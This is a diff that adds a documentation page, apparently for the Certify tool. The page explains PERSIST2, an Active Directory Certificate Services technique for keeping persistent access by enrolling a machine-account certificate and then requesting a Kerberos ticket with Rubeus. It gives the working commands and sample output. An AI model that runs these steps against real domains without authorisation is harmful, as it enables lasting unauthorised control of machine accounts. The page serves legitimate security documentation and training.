@@ -1,0 +1,163 @@
+---
+title: 'PERSIST2 - Machine Persistence via Certificates'
+description: 'Learn how to extend initial access to a machine into persistent access by requesting a client authentication certificate in the context of the machine account.'
+icon: 'server'
+sidebarTitle: 'PERSIST2 - Machine Persistence via Certificates'
+---
+
+PERSIST2 is a technique used to extend initial access to a machine into persistent access by requesting a client authentication certificate in the context of the machine account, which can be used for future authentication as the machine account. This requires administrative privileges on the system.
+
+## Template Requirements
+
+According to [Certified Pre-Owned](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf), the following criteria comprise a suitable certificate template:
+
+<Accordion title="Enterprise CA Enrollment Rights">
+The enterprise CA grants enrollment rights to the machine account. Otherwise, the account would be unable to request any certificates from the CA.
+</Accordion>
+
+<Accordion title="Template Enrollment Rights">
+The certificate template grants enrollment rights to the machine account. Otherwise, the account would be unable to request certificates based on the specific template.
+</Accordion>
+
+<Accordion title="Manager Approval Disabled">
+The "manager approval" feature is disabled for the certificate template. Otherwise, a "CA Manager" would have to manually review and approve the certificate request.
+</Accordion>
+
+<Accordion title="Authorized Signature Disabled">
+The "authorized signature" feature is disabled for the certificate template. Otherwise, an enrollment agent would need to sign the certificate request on behalf of the requester.
+</Accordion>
+
+<Accordion title="Client Authentication EKU">
+The certificate template defines an Extended Key Usage (EKU) that enables client authentication:
+- `Client Authentication` (`1.3.6.1.5.5.7.3.2`)
+- `PKINIT Client Authentication` (`1.3.6.1.5.2.3.4`)
+- `Smart Card Logon` (`1.3.6.1.4.1.311.20.2.2`)
+- `Any Purpose` (`2.5.29.37.0`)
+- `Subordinate CA` (No EKUs)
+</Accordion>
+
+## Enumeration
+
+We can search for certificate templates with these conditions using the `enum-templates --filter-client-auth` command from Certify. For more information about the command and its parameters, please refer to the [Command Overview](./1-command-overview) page.
+
+```diff
+> Certify.exe enum-templates --filter-enabled --filter-client-auth --hide-admins
+
+   _____          _   _  __
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ '__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v2.0.0
+
+[*] Action: Find certificate templates
+[*] Using the search base 'CN=Configuration,DC=corp,DC=local'
+[*] Classifying vulnerabilities in the context of built-in low-privileged domain groups.
+
+...
+
+[*] Enabled certificate templates found using the current filter parameters:
+
+    Template Name                         : Machine
+    Enabled                               : True
+    Publishing CAs                        : ca01.corp.local\CORP-CA01-CA
+    Schema Version                        : 1
+    Validity Period                       : 1 year
+    Renewal Period                        : 6 weeks
+    Certificate Name Flag                 : SUBJECT_ALT_REQUIRE_DNS, SUBJECT_REQUIRE_DNS_AS_CN
+    Enrollment Flag                       : AUTO_ENROLLMENT
++   Manager Approval Required             : False
++   Authorized Signatures Required        : 0
++   Extended Key Usage                    : Client Authentication, Server Authentication
+    Certificate Application Policies      : <null>
+    Permissions
+      Enrollment Permissions
++       Enrollment Rights           : CORP\Domain Computers           S-1-5-21-976219687-1556195986-4104514715-515
+      Object Control Permissions
+
+Certify completed in 00:00:01.7777410
+```
+
+Once we have identified a suitable certificate template that the machine account can enroll in, we can request a certificate based on the template using the `request` command from Certify.
+
+<Info>
+Note the use of the `--machine` parameter to request a certificate for the machine account rather than the current user account.
+</Info>
+
+```
+> Certify.exe request --ca ca01.corp.local\CORP-CA01-CA --template Machine --machine
+
+   _____          _   _  __
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ '__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v2.0.0
+
+[*] Action: Request a certificate
+[*] Elevating to SYSTEM context for machine cert request
+
+[*] Current user context    : NT AUTHORITY\SYSTEM
+[*] No subject name specified, using current machine as subject
+
+[*] Template                : Machine
+[*] Subject                 : CN=WS01.corp.local
+
+[*] Certificate Authority   : ca01.corp.local\CORP-CA01-CA
+[*] CA Response             : The certificate has been issued.
+[*] Request ID              : 1
+
+[*] Certificate (PFX)       :
+
+MIACAQMwgAYJKoZIhvcNAQcBoIAkgASCA+gwgDCABgkqh...
+
+Certify completed in 00:00:03.5329344
+```
+
+When the certificate has been issued, it can be used to persistently authenticate as the machine account using the [`asktgt`](/GhostPack/Rubeus-mdx/commands/ticket-requests/asktgt) command from [Rubeus](/ghostpack-docs/Rubeus-mdx/overview).
+
+```
+> Rubeus.exe asktgt /user:WS01$ /certificate:MIACAQMwgAYJKoZIhvcNAQcBoIAkgASCA+gwgDCABgkqh...
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.0.2
+
+[*] Action: Ask TGT
+
+[*] Using PKINIT with etype rc4_hmac and subject: CN=WS01.corp.local
+[*] Building AS-REQ (w/ PKINIT preauth) for: 'corp.local\WS01$'
+[*] Using domain controller: 10.10.10.10:88
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+      doIGAjCCBf6gAwIBBaEDAgEWooIFFzCCBRNhggUPMIIFC6ADAgEFoQ8bDU1FR0FLRUsuTE9DQUyiIjAg
+      ...
+
+  ServiceName              :  krbtgt/corp.local
+  ServiceRealm             :  CORP.LOCAL
+  UserName                 :  WS01$
+  UserRealm                :  CORP.LOCAL
+  StartTime                :  30/06/2025 15.32.19
+  EndTime                  :  01/07/2025 01.32.19
+  RenewTill                :  07/07/2025 15.32.19
+  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
+  KeyType                  :  rc4_hmac
+  Base64(key)              :  1c0P/+z4mogj2vJl122GvA==
+  ASREP (key)              :  B357DDA2405237F78276BB9DA9720749
+```
+
+<Warning>
+The issued certificate will be able to authenticate for as long as is mentioned in the `Validity Period` attribute of the certificate template. In order to extend the persistence period, you need to abuse [PERSIST3 - Account Persistence via Certificate Renewal](./persist3-account-persistence-via-certificate-renewal).
+</Warning>
